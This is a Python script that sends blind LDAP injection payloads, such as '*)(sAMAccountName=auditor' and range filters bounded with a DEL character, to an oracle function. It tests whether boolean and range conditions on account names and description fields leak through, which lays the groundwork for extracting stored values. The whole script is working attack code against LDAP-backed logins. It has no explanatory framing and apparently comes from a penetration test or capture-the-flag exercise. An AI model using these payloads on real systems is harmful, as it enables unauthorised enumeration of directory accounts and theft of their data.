#!/usr/bin/env python3
import pool_extract as P

P.init_pool()
DEL = chr(0x7F)

tests = [
    ("*)(sAMAccountName=auditor", "known exact user (expect True)"),
    ("*)(sAMAccountName=auditor)(sAMAccountName=*", "two conditions incl. self (expect True)"),
    ("*)(sAMAccountName>=auditor)(sAMAccountName<audito" + DEL, "range == auditor (expect True)"),
    ("*)(sAMAccountName>=audito)(sAMAccountName<auditoz", "range prefix audito (expect True)"),
    ("*)(sAMAccountName>=zzzz)(sAMAccountName<zzzzz", "empty range (expect False)"),
    ("*)(sAMAccountName>=a)(sAMAccountName<z", "big range (expect True)"),
    ("*)(description=change*", "desc prefix change (expect True)"),
    ("*)(description>=a)(description<z", "desc range a..z (expect ?)"),
    ("*)(description>=c)(description<d", "desc range c..d (expect ?)"),
    ("*)(description>=change)(description<change" + DEL, "desc == change (expect ?)"),
    ("*)(description>=change" + DEL + ")(description<chanh", "desc > change (expect ?)"),
]

for inj, note in tests:
    print(f"{P.oracle(inj)!s:5s} {note}", flush=True)
print(f"requests: {P.REQ[0]}", flush=True)
